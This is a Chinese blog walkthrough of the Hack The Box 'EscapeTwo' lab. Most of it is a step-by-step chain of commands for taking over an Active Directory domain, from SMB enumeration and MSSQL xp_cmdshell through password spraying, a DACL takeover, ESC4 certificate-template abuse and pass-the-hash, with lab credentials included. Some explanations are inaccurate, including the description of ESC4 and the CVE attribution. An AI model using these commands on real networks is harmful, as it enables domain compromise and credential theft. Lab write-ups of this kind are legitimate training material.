---
title: "HTB 第七期 Escapetwo"
onlyTitle: true
date: 2025-3-20 22:35:15
categories:
- 内网渗透
- HTB WP
tags:
- 域渗透
- HTB
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8139.png
---

不会内网渗透，被面试官狠狠羞辱

难受死了，刷HTB来了，放弃治疗

VPN用的欧盟+TCP，美国的似乎用不了

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250318201602241.png)

# HTB第七期

## Escapetwo

其实是个CVE-2022-26923 ADCS域提权漏洞靶机

没有命令解析，自己拖到gpt问，也根本不需要知道原理，基本都用一样的参数

记得kali里渗透要把openvpn挂到kali

rustscan扫一下全端口

```bash
./rustscan -a 10.10.11.51 -r 1-65535 --ulimit 5000 | tee res
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250318221744234.png)

保存一下结果res：

```shell
ports=$(grep ^[0-9] res | cut -d/ -f1 | paste -sd,)
echo $ports
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250318221913070.png)

nmap对以上端口进行服务指纹扫描（nmap跑这种老是直接卡住，要等好几分钟，别急）：

```bash
nmap -sT -p$ports -sCV -Pn 10.10.11.51
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250318223034493.png)

```
    AD域名：sequel.htb
    53端口：Domain服务
    88端口：Kerberos服务
    389端口：LDAP服务
    445端口：SMB服务
    1433端口：SQL-Server服务
    5985端口：Win-RM服务
```

**Windows RM 服务**（Remote Management Service）是指 Windows 操作系统中用于远程管理的服务，通常是通过 **Windows Management Instrumentation (WMI)** 或 **Windows Remote Management (WinRM)** 实现的。WinRM 允许通过网络远程管理 Windows 机器，尤其是在企业环境中进行系统管理、配置、诊断等任务。

nmap扫服务和相关漏洞：

```bash
nmap -sT -p$ports --script=vuln -O -Pn 10.10.11.51
```

经典没扫到

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250318224318768.png)

nmap扫udp端口：

```bash
nmap -sU --top-ports 20 -Pn 10.10.11.51
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250318224458598.png)

`open|filtered`**Nmap 不能确定该端口是开放（open）还是被过滤（filtered）**，原因如下： 1️⃣ **未收到响应**：UDP **不像 TCP**，没有 **SYN-ACK** 机制，因此不会主动确认是否开放。

扫一下确认开放的53和123端口服务和漏洞，就开了个dns的递归查询，没什么鸟用

```bash
nmap -sU -p53,123 -sCV -Pn 10.10.11.51
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250318224751423.png)

SMBMap 是 渗透测试工具，用于 枚举 SMB 共享、检查权限，并读取、写入或执行文件。它常用于 Windows SMB（Server Message Block）协议 的安全测试，能够帮助渗透测试人员发现潜在的 未授权访问、弱口令、敏感文件 及 远程代码执行 机会。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250318225413544.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250318225436239.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250318225447735.png)

按照题目给的hint登录一下

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250318224925799.png)

```
smbmap -u 'rose' -p 'KxEPkKe6R8su' -H 10.10.11.51
```

该命令用于 **枚举 Windows 服务器（IP: `10.10.11.51`）的 SMB 共享**，并尝试以 `rose` 账户登录，查看该账户对共享目录的访问权限。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250319104015988.png)

```bash
smbmap -u 'rose' -p 'KxEPkKe6R8su' -H 10.10.11.51 -r 'Accounting Department'
```

该命令用于 **递归列出 SMB 共享 `Accounting Department` 目录的所有文件**，尝试以 `rose` 账户访问 `10.10.11.51` 服务器上的 SMB 共享。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250319121323243.png)

可以看到有accounting_2024.xlsx和accounts.xlsx

顺便看一下Users目录：

```bash
smbmap -u 'rose' -p 'KxEPkKe6R8su' -H 10.10.11.51 -r 'Users'
smbmap -u 'rose' -p 'KxEPkKe6R8su' -H 10.10.11.51 -r 'Users/Default'
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250319121736647.png)

Users/Default：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250319122248297.png)

这么多？直接smbclient登上去看

```bash
smbclient //10.10.11.51/Accounting\ Department -U rose%KxEPkKe6R8su
```

下载一下几个敏感文件：

```bash
get accounting_2024.xlsx
get accounts.xlsx
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250319123655627.png)

打开看到accounts.xlsx有username和password，其中有个username比较怪，名称为sa

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250319170636235.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250319170906708.png)

爆破一下看smb有没有可用账户，虽然上面已经给出了。把username和password分别放到两个文件，然后用nxc爆破smb

>NetExec，在kali上叫nxc，自带的工具
>
>![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250319171701230.png)
>
>官方wiki：https://www.netexec.wiki

```bash
nxc smb 10.10.11.51 -u username -p passwd
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250319171152634.png)

可以看到oscar:86LxLBMgEWaKUnBG能用

`smbmap -u 'oscar' -p '86LxLBMgEWaKUnBG' -H 10.10.11.51`

拿去访问可以看到并没有可以多进哪个目录，所以暂时没用

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250319172322731.png)

现在考虑一下打mssql

依然用nxc去打mssql

可以使用两种方法对 MSSQL 进行身份验证，即windows或local(mssql) ，默认身份验证是 windows。要使用本地身份验证，要在命令中添加以下标志–local-auth 

了执行系统级命令，可以使用**-x**标志，它使用 MSSQL **xp_cmdshell**来执行命令。（关于xp_cmdshell的执行条件自己搜）

```bash
nxc mssql 10.10.11.51 -u 'sa' -p 'MSSQLP@ssw0rd!' --local-auth -X 'whoami'
```

可以看到显示Pwn3d!，攻击成功，执行了whoami

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250319103539882.png)

dir列一下目录

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250319104312243.png)

看一下SQL2019目录

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250319104419905.png)

继续看ExpressAdv_ENU

```bash
nxc mssql 10.10.11.51 -u 'sa' -p 'MSSQLP@ssw0rd!' --local-auth -X 'dir "C:\SQL2019\ExpressAdv_ENU"'
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250319105650630.png)

查看sql-Configuration.INI文件，得知SQLSVCACCOUNT为SEQUEL\sql_svc，SQLSVCPASSWORD为WqSZAF6CysDQbGb3，还有个Administrator账户，但是没有密码

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250319110109881.png)

前面信息搜集的过程kerberos服务和ldap很容易看出是个域环境，`net user /domain`看下域用户

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250319111150980.png)

一共9个用户，提取出来，密码固定为`WqSZAF6CysDQbGb3`。ldap和mssql的关系如下，在windows身份验证时，mssql会通过ldap验证和查询域用户的身份，所以用mssql的密码去撞下ldap的库，当然也可以把以上accunts.xlsx的用户和密码也拿去撞一遍

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250319230340008.png)

得到ldap中用户ryan,sql_svc的密码都是`WqSZAF6CysDQbGb3`

`nxc ldap 10.10.11.51 -u username -p 'WqSZAF6CysDQbGb3' --continue-on-success`

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250319230853627.png)

ldap内的用户很可能有远程登录，也就是win-RM的权限，用evil-winrm登录

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250319231355501.png)

成功登录，在Desktop下找到user.txt，其实前面smb共享也能找到，可以拿去交一个flag

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250319231508088.png)

使用BloodHound查看ryan用户的可传递控制对象

>**BloodHound** 是一个用于 **Active Directory**（AD）环境的安全工具，专门设计用来帮助识别和攻击 **权限提升** 和 **横向移动** 的漏洞。它的主要目标是帮助渗透测试人员和红队人员发现 **Active Directory** 中的权限过度委派、继承权限、用户之间的关系以及潜在的攻击路径，从而进行权限提升（Privilege Escalation）或横向渗透（Lateral Movement）。

```bash
nxc ldap 10.10.11.51 -u 'ryan' -p 'WqSZAF6CysDQbGb3' --dns-server 10.10.11.51 --bloodhound -c All
```

一定要绑定dns-server，不然默认使用本机的dns-server，目标机肯定访问不了本机的dns-server所以报错

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250319235251966.png)

在 **域环境** 中，**DNS** 服务器负责将域名解析为 IP 地址。许多基于域的工具（如 **BloodHound**、**NXC**、**LDAP 查询** 等）需要通过 **DNS** 来定位 **域控制器**、计算机、用户和其他资源。指定一个 DNS 服务器可以确保工具能够正确解析目标域的相关信息。

执行命令ipconfig /all可以看到dns-server就是目标机的ip，所以本机既是DNS服务器也是域控。`--dns-server 10.10.11.51`

>DNS服务器和域控制器通常配置在一台机器上

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250319235842792.png)

bloodhound搜索横向后在本地会输出一个DC01_10.10.11.41-data_bloodhound.zip

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250320000120940.png)

需要下一个bloodhound、配好neo4j数据库，具体配置网上搜（备忘录：我的neo4j帐号密码neo4j kali）

关于bloodhound可以看https://cloud.tencent.com/developer/article/2149122

域的基础概念：https://cblog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/12.%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/01.%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/05.%E5%9F%9F%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86

在每个节点与节点之间都有对应的关系，分别代表着不同的意思。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250320033901912.png)

**ACL Edges**

- AllExtendedRights 扩展权限是授予对象的特殊权限，这些对象允许读取特权属性以及执行特殊操作；如果对象是用户，则可以重置用户密码；如果是组，则可以修改组成员；如果是计算机，则可以对该计算机执行基于资源的约束委派。
- AddMember 可以向目标安全组添加任意成员。
- ForceChangePassword 可以任意重置目标用户密码。
- GenericAll 可以完全控制目标对象。
- GenericWrite 写入权限，修改目标的属性或者将主体添加入组等。
- Owns 保留修改 security descriptors 的能力，会忽略DACL权限的限制。
- WriteDacl 可写入目标DACL，修改DACL访问权。
- WriteOwner 保留修改 security descriptors的能力，会忽略DACL权限的限制。
- ReadLAPSPassword 读取LAPS上的本地管理员凭证。
- ReadGMSAPassword 读取GMSA上的本地管理员凭证。

>**Security Descriptors**（安全描述符）是 **Windows 操作系统** 和 **Active Directory** 中用来定义和存储对象的 **安全信息** 的数据结构。它包含了与 **访问控制** 和 **权限** 相关的信息，决定了哪些用户、组或计算机能够访问某个对象（例如文件、文件夹、用户账户、计算机账户等）以及他们的访问权限。

选中RYAN账户，点击左边的Node Info -> Transitive Object Control 分析一下RYAN对其他对象的控制权（outbound object control），inbound Control right就是其他对象对RYAN用户的控制权

可以看到RYAN对CA_SVC有WriteOwner权限

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250320045345120.png)

先获取一波ca_svc的权限：

用bloodyAD将ca_svc用户拥有者改为ryan

```bash
bloodyAD -d 10.10.11.51 --dc-ip 10.10.11.51 --dns 10.10.11.51 -u 'ryan' -p 'WqSZAF6CysDQbGb3' set owner 'ca_svc' 'ryan'
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250320051934079.png)

得想办法把ryan对ca_svc的权限改为完全控制，kali自带了fortra的impacket工具集

DACL 的主要作用是控制对对象的访问权限，具体来说，它定义了哪些 **用户** 或 **组** 可以对该对象执行哪些操作，如读取、写入、删除等。把ca_svc对ryan的DACL值改为write

```bash
impacket-dacledit -action 'write' -principal 'ryan' -target 'ca_svc' '10.10.11.51/ryan:WqSZAF6CysDQbGb3'
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250320055457910.png)

看一下ca_svc属于什么组：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250320081211319.png)

属于Cert Publishers组

从图可以知道ADMINISTRATOR在DOMAIN ADMINS组，flag很明显大概率在ADMINISTRATOR主机上

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250320065740141.png)

看一下当前域系统：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250320061923892.png)

在 Active Directory 环境中，证书模板定义了哪些用户、计算机或服务可以申请特定类型的证书。Certify 可以利用证书模板中的配置漏洞或错误设置，发起证书请求，甚至伪造合法证书。该漏洞编号为CVE-2022-26923，属于ADCS安全问题。上述版本也满足要求

下面是伪造证书

先定位一下当前的ADCS服务器，主要看NAME和Server的值，额，本机就是ADCS

```bash
certutil -dump -v
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250320061722998.png)

伪造证书的过程：

1. 需要有一个本地账户用于被伪造，一般来说certipy-ad在auto模式创建影子账户时会尝试获取TGT票据，获取了TGT会自动获取到NTLM，其实也可以手动获取NTLM去设置
2. 需要知道证书模板，根据证书模板的所有权和能行使的权利进一步利用。制作好的证书上传到靶机进一步利用

```bash
certipy-ad shadow auto -u 'ryan@sequel.htb' -p 'WqSZAF6CysDQbGb3' -account 'ca_svc' -target 10.10.11.51 -dc-ip 10.10.11.51 -ns 10.10.11.51
```

可以看出尝试获取TGT时报错：Clock skew too great，时钟差异太大。

>**"Clock skew too great"** 错误通常是由于 **Kerberos** 身份验证过程中 **客户端** 和 **KDC**（Key Distribution Center，密钥分发中心）之间的时钟差异过大导致的。Kerberos 协议对时钟的同步非常敏感，通常要求客户端和服务器的时间差异不能超过一定的阈值（通常是 5 分钟）

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250320055753031.png)

把本地时钟和靶机同步：

```bash
ntpdate 10.10.11.51
```

再次执行：

```bash
certipy-ad shadow auto -u 'ryan@sequel.htb' -p 'WqSZAF6CysDQbGb3' -account 'ca_svc' -target 10.10.11.51 -dc-ip 10.10.11.51 -ns 10.10.11.51
```

以上命令出现会由于时间流逝靶机定时检查而出现问题（HTB重置环境），建议从bloodyAD设置所有权开始重新执行一遍，直到TGT获取成功

```bash
bloodyAD -d 10.10.11.51 --dc-ip 10.10.11.51 --dns 10.10.11.51 -u 'ryan' -p 'WqSZAF6CysDQbGb3' set owner 'ca_svc' 'ryan'
impacket-dacledit -action 'write' -principal 'ryan' -target 'ca_svc' '10.10.11.51/ryan:WqSZAF6CysDQbGb3'
ntpdate 10.10.11.51
certipy-ad shadow auto -u 'ryan@sequel.htb' -p 'WqSZAF6CysDQbGb3' -account 'ca_svc' -target 10.10.11.51 -dc-ip 10.10.11.51 -ns 10.10.11.51
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250320060531895.png)

现在有ca_svc的本地影子账户能用了

证书模板之所以叫模板，是有固定格式的，可以进行爆破知道用的什么模板。上传Certify爆破靶机域内证书模板：

Certify.exe：https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Certify.exe

evil-winrm提供了upload命令上传文件

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250320063240935.png)

枚举域内证书模板：

```bash
.\Certify.exe find /domain:sequel.htb
```

关注一下证书的Permissions字段

>**Object Control Permissions** 是控制谁可以修改、删除或管理证书模板和对象配置的权限。
>
>**Enrollment Permissions** 是控制谁可以请求和注册证书的权限，决定哪些用户可以申请证书或使用证书模板。

其中模板名叫DunderMifflinAuthentication的模板中，

1. **Domain Admins** 组具有 **Enroll Rights**（注册权限），意味着 **Domain Admins** 组的成员可以使用该模板来申请证书。用该证书能注册一个Domain Admins成员
2. **Object Control Permissions** 部分显示了 **Cert Publishers** 组拥有该证书模板的 **Full Control** 权限，意味着 **Cert Publishers** 组的成员可以修改、删除、配置该模板的权限设置、修改证书模板的配置等操作。

该模板对**Domain Admins**具有注册权利，而且**Cert Publishers**对该模板具有完全控制权限，因此恶意利用该模板即可获取管理员密码哈希

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250320065152471.png)

通过上面创建影子账户获取TGT的哈希枚举靶机ADCS检测漏洞

```bash
certipy-ad find -u ca_svc@10.10.11.51 -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -vulnerable -stdout
```

可以看到报Vulnrabilities ESC4

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250320083507748.png)

ESC4 漏洞允许攻击者通过对特定 **SSO（Single Sign-On）** 配置的滥用，窃取 **Windows** 身份验证信息。

伪造模板证书：

```bash
ntpdate 10.10.11.51
certipy-ad template -u ca_svc@sequel.htb -hashes '3b181b914e7a9d5508ea1e20bc2b7fce' -k -template 'DunderMifflinAuthentication' -target DC01.sequel.htb -ns 10.10.11.51 -debug
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250320082143947.png)

请求Administrator@sequel.htb

```bash
ntpdate 10.10.11.51

certipy-ad template -u ca_svc@sequel.htb -hashes '3b181b914e7a9d5508ea1e20bc2b7fce' -k -template 'DunderMifflinAuthentication' -target DC01.sequel.htb -ns 10.10.11.51 -debug

echo y | certipy-ad req -u ca_svc@sequel.htb -hashes '3b181b914e7a9d5508ea1e20bc2b7fce' -ca sequel-DC01-CA -template 'DunderMifflinAuthentication' -upn Administrator@sequel.htb -target DC01.sequel.htb -ns 10.10.11.51 -dns 10.10.11.51 -dc-ip 10.10.11.51
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250320084456640.png)

借助上一步请求得到的pfx证书通过身份认证，因为请求伪造时间原因，需要在请求后立即登录

而且由于是本地直接登录，需要解析sequel.htb，而生成证书又必须使用sequel.htb而不能用ip，所以配下host

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250320091056881.png)

```bash
ntpdate 10.10.11.51

certipy-ad template -u ca_svc@sequel.htb -hashes '3b181b914e7a9d5508ea1e20bc2b7fce' -k -template 'DunderMifflinAuthentication' -target DC01.sequel.htb -ns 10.10.11.51 -debug

echo y | certipy-ad req -u ca_svc@sequel.htb -hashes '3b181b914e7a9d5508ea1e20bc2b7fce' -ca sequel-DC01-CA -template 'DunderMifflinAuthentication' -upn Administrator@sequel.htb -target DC01.sequel.htb -ns 10.10.11.51 -dns 10.10.11.51 -dc-ip 10.10.11.51

echo 0 | certipy-ad auth -pfx administrator_10.pfx
```

获得了administrator的hash

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250320085347633.png)

impacket-psexec直接登录

如果目标不出网的话还需要考虑一下内网穿透，但是我们直接vpn链接的，不用考虑不出网的问题

```bash
impacket-psexec sequel.htb/administrator@10.10.11.51 -hashes 'aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff'
```

Desktop找到第二个flag

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250320092046658.png)











下面准备歇一段时间了，一场面试让我有点见不着光，问我权限维持，sql过市面上的WAF，钓鱼邮件上线的流程，我都不知道，有点对自己失望。打算看一段时间内网的很多知识，因为是看， 没什么实操，所以也不想写。等一段时间再见吧。

